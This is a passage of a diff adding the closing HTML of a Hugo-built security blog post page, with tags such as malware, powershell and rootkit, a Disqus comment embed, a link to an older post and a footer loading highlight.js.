+                    <a class="article-tag-list-link" href="http://wroot.org//tags/malware">malware
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/persistance">persistance
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/powershell">powershell
+                    </a>
+                </li>
+                
+                <li class="article-tag-list-item">
+                    <a class="article-tag-list-link" href="http://wroot.org//tags/rootkit">rootkit
+                    </a>
+                </li>
+                
+            </ul>
+        </footer>
+        
+    </div>
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wroot" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    <nav id="article-nav">
+    
+    
+    <a href="/posts/introducing-virtuaplant-0-1/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">Introducing VirtuaPlant 0.1&nbsp;<span>&gt;</span></div>
+    </a>
+    
+</nav>
+</article>
+
+        
+    </section>
+    <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2019 wroot&nbsp;
+            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with (a slightly modified) theme <a href="https://github.com/carsonip/hugo-theme-minos">Minos</a>
+        </div>
+    </div>
+    
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    
+    <script>
+        document.getElementById('main-nav-toggle').addEventListener('click', function () {
+            var header = document.getElementById('header');
+            if (header.classList.contains('mobile-on')) {
+                header.classList.remove('mobile-on');
+            } else {
+                header.classList.add('mobile-on');
+            }
+        });
+    </script>
+</footer>
+
+</div>
+</body>
+</html>
